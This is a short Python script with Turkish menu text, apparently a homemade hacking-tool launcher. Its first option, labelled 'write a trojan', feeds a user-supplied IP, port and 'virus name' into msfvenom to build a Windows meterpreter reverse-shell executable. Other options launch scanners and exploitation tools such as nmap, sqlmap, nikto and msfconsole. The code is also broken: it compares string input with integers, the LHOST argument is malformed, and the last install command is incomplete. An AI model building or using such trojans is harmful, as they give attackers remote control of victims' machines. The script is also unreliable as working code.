import os
# -*- encoding: utf-8 -*- #

os.system("clear")

banner="""
------------
CANS OFFICIALL WEB TOOLS
------------
"""
print(banner)

print("""
1)trojan yaz
2)nmap baslat
3)sqlmap i baslat
4)dns tara
5)msf basla
6)nikto ac
7)gerekli itemler
""")
veri=input("----->")

if veri == 1 :

     ip=input("cihaz kimligini giriniz:")
     port=input("portu giriniz:")
     ismin=input("virus ismi:")
     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)

elif veri == 2 :
     os.system("nmap")

elif veri == 3 :
     os.system("sqlmap")

elif veri == 4 :
     os.system("dnsenum")

elif veri == 5 :
     os.system("msfconsole")

elif veri == 6 :
     os.system("nikto")

elif veri == 7 :
     os.system("apt update && pkg upgrade && pkg install python && pkg install python2 && pkg install php && pkg install curl && pkg install perl && git clone https://github.com/sqlmapproject/sqlmap && pkg install nmap && git clone https://github.com/cansofficall/CnsAdScn && git clone https://github.com/cansofficall/salvo && https://github.com/cansofficall/SeS ")

else :
    print("hata aldim")
